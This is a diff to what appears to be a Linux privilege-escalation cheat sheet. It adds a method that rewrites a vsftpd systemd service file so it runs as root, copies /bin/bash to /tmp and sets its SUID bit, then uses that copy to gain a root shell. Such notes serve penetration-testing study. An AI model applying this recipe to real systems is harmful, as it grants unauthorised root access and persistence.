@@ -633,6 +633,28 @@ systemctl enable --now $TF
 /bin/bash -p
 id && whoami
 ```
+OR
+```
+//Edit .service file
+[Unit]
+Description=vsftpd FTP server
+After=network.target
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'cp /bin/bash /tmp/bash; chmod +xs /tmp/bash'
+#ExecReload=/bin/kill -HUP $MAINPID
+#ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty
+
+[Install]
+WantedBy=multi-user.target
+
+//Reload daemon
+systemctl daemon-reload //enter user pass after this
+
+//run the bash to escalate
+```
 
 Example 5 (Copy - /bin/cp)
 
